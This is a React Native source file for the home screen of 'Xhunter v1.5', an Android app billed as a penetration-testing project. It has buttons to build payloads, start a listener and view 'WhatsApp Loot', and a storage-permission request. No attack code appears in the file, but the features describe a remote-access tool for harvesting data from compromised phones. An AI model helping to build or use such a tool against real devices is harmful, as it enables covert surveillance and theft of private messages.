import React, { useEffect } from "react";
import { PermissionsAndroid } from 'react-native';
import { 
    Box,
    StatusBar, 
    Icon,
    Button,
    Link,
    Badge,
    HStack,
    Spacer,
    Text,
    Flex,
    useToast
} from "native-base";
import nodejs from 'nodejs-mobile-react-native';
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';

const Home = ({navigation}) => {
  const toast = useToast();
  useEffect(()=>{
    nodejs.channel.addListener("log",(log) => console.info(log), this);
  },[])

  const handleAppBuilder = ()=>{
    navigation.navigate('payloadBuilder')
  }
  const handleLoot = async()=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
     if (granted) {
      navigation.navigate('loot')
     }else{
      requestPermission();
     }
  }

  async function requestPermission() 
   { 
     try {
          const granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE)
          if (granted!== PermissionsAndroid.RESULTS.GRANTED) {
               toast.show({ title: "Permission not granted", status: "error",placement: "top",description: "Please grant permission"})
          } 
        } catch (err) { } 
   }
   

  
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop bg={"primary"}/>
    <Box flex={1}  bg={"primary"} px={'10'} >
    <Box mt={10} mb={20}  >
      <Link href="https://github.com/anirudhmalik/xhunter" isExternal>
        <Box maxW="96" borderWidth="1" borderColor="coolGray.300" shadow="3" bg="coolGray.100" p="5" rounded="8">
          <HStack alignItems="center">
            <Badge colorScheme="darkBlue" _text={{
            color: "white"
          }} variant="solid" rounded="4">
              Open Source
            </Badge>
            <Spacer />
            <Text fontSize={10} color="coolGray.800">
              2022
            </Text>
          </HStack>
          <Text color="coolGray.800" mt="3" fontWeight="medium" fontSize="xl">
            Xhunter v1.5
          </Text>
          <Text mt="2" fontSize="sm" color="coolGray.700">
          Xhunter Project is android security penetration project that provides information about security vulnerabilities and aids in ...
          </Text>
          <Flex>
            <Text mt="2" fontSize={12} fontWeight="medium" color="darkBlue.600">
              Read More
            </Text>
          </Flex>
        </Box>
      </Link>
    </Box>;
    <Button variant={'subtle'} onPress={handleAppBuilder} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build Payloads'}
    </Button>
    <Button onPress={()=>navigation.navigate("listenerOptions")} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
     {'Start Listening'}
    </Button>
    <Button onPress={handleLoot} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'WhatsApp Loot'}
    </Button>
    </Box>
    </>
    )
};

export default Home;

  